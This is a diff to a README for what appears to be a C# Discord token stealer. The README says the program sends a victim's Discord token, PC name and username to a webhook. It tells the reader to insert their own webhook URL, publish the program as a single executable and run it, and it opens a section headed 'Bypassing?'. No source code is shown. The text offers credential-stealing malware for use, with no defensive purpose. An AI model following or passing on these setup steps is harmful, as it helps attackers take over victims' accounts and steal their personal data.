@@ -4,7 +4,7 @@ Sends embed to discord webhook containing Discord token, PC Name, Username, and 
 
 # How to use?
 Clone this repo and inside PrintAllInfo.cs you should see a url string, replace the url with your own discord webhook (not the double quotes)
-you can publish as onefile and when ran, it will send an embed containing users details.
+you can publish as onefile and when ran, it will send an embed containing users details. EDIT: you can figure out how to get exe
 
 
 # Bypassing?
